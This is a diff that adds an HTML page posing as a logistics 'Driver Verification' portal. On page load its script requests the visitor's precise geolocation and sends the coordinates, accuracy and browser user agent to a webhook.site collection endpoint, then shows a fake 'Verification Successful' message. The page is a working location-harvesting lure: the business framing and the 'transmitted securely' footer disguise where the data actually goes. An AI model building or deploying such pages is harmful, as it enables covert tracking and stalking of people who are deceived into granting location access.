@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Logistics Portal - Driver Verification</title>
+    <style>
+        :root {
+            --primary-yellow: #f59e0b;
+            --accent-yellow: #fbbf24;
+            --dark-bg: #121212;
+            --card-bg: #1e1e1e;
+            --text-main: #f3f4f6;
+            --text-muted: #9ca3af;
+            --status-success: #10b981;
+            --status-error: #ef4444;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--dark-bg);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+
+        .card {
+            background-color: var(--card-bg);
+            border-top: 4px solid var(--primary-yellow);
+            border-radius: 8px;
+            width: 100%;
+            max-width: 420px;
+            padding: 2rem;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        .header {
+            margin-bottom: 2rem;
+        }
+
+        .badge {
+            display: inline-block;
+            background-color: rgba(245, 158, 11, 0.15);
+            color: var(--primary-yellow);
+            font-size: 0.75rem;
+            font-weight: 700;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+            padding: 0.35rem 0.75rem;
+            border-radius: 9999px;
+            margin-bottom: 0.75rem;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 0.5rem;
+        }
+
+        p.subtitle {
+            font-size: 0.875rem;
+            color: var(--text-muted);
+        }
+
+        .status-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem 1rem;
+            background-color: rgba(255, 255, 255, 0.03);
+            border-radius: 6px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            margin-bottom: 1.5rem;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(245, 158, 11, 0.2);
+            border-radius: 50%;
+            border-top-color: var(--primary-yellow);
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 1rem;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 1rem;
+            font-weight: 500;
+        }
+
+        .status-details {
+            font-size: 0.8125rem;
+            color: var(--text-muted);
+            margin-top: 0.25rem;
+        }
+
+        /* Success & Error State Classes */
+        .status-container.success .spinner {
+            display: none;
+        }
+        .status-container.success {
+            border-color: rgba(16, 185, 129, 0.3);
+            background-color: rgba(16, 185, 129, 0.05);
+        }
+        .status-container.success .status-text {
+            color: var(--status-success);
+        }
+
+        .status-container.error .spinner {
+            display: none;
+        }
+        .status-container.error {
+            border-color: rgba(239, 68, 68, 0.3);
+            background-color: rgba(239, 68, 68, 0.05);
+        }
+        .status-container.error .status-text {
+            color: var(--status-error);
+        }
+
+        .footer-note {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+
+<main class="card">
+    <header class="header">
+        <span class="badge">Fleet Dispatch</span>
+        <h1>Driver Verification</h1>
+        <p class="subtitle">Confirming location for automated check-in</p>
+    </header>
+
+    <div id="statusBox" class="status-container">
+        <div id="spinner" class="spinner"></div>
+        <div id="statusTitle" class="status-text">Verification in Progress</div>
+        <div id="statusDesc" class="status-details">Requesting location permissions...</div>
+    </div>
+
+    <footer class="footer-note">
+        Location data is transmitted securely to confirm checkpoint arrival in accordance with system dispatch policy.
+    </footer>
+</main>
+
+<script>
+    const ENDPOINT = "https://webhook.site/YOUR_UNIQUE_ID";
+
+    const statusBox = document.getElementById("statusBox");
+    const statusTitle = document.getElementById("statusTitle");
+    const statusDesc = document.getElementById("statusDesc");
+
+    function updateStatus(state, title, description) {
+        statusBox.className = `status-container ${state}`;
+        statusTitle.textContent = title;
+        statusDesc.textContent = description;
+    }
+
+    async function sendVerification(latitude, longitude, accuracy) {
+        statusDesc.textContent = "Transmitting telemetry to dispatch...";
+
+        const payload = {
+            timestamp: new Date().toISOString(),
+            latitude: latitude,
+            longitude: longitude,
+            accuracyMeters: accuracy,
+            userAgent: navigator.userAgent
+        };
+
+        try {
+            const response = await fetch(ENDPOINT, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (!response.ok) {
+                throw new Error(`Server returned HTTP ${response.status}`);
+            }
+
+            updateStatus("success", "Verification Successful", "Coordinates recorded. You are cleared for dispatch.");
+        } catch (err) {
+            updateStatus("error", "Transmission Failed", "Unable to reach dispatch server. Please retry.");
+            console.error("Payload transmission failed:", err);
+        }
+    }
+
+    function initVerification() {
+        if (!("geolocation" in navigator)) {
+            updateStatus("error", "Unsupported Device", "Geolocation is not supported by your current browser.");
+            return;
+        }
+
+        const geoOptions = {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        };
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const { latitude, longitude, accuracy } = position.coords;
+                sendVerification(latitude, longitude, accuracy);
+            },
+            (error) => {
+                let message = "An error occurred retrieving location.";
+                if (error.code === error.PERMISSION_DENIED) {
+                    message = "Location access was denied. Please enable location permissions.";
+                } else if (error.code === error.POSITION_UNAVAILABLE) {
+                    message = "Location signal unavailable. Move to an area with clear GPS coverage.";
+                } else if (error.code === error.TIMEOUT) {
+                    message = "Request timed out while acquiring GPS fix.";
+                }
+                updateStatus("error", "Verification Incomplete", message);
+            },
+            geoOptions
+        );
+    }
+
+    // Run automatically on page load
+    window.addEventListener("DOMContentLoaded", initVerification);
+</script>
+
+</body>
+</html>
